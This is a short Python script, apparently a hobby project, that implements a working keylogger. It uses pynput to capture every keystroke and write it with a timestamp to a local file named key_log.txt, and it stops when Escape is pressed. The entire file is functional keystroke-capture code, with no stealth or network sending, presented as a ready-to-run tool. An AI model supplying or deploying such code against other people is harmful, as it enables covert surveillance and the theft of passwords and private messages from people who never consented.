# library
from pynput.keyboard import Key, Listener
# vanila
import logging

# make a log file
log_dir = ""

#TODO: delete the previous logs in the file
#asctime = ascending order, lastest on the bottom
logging.basicConfig(filename=(log_dir)+"key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()

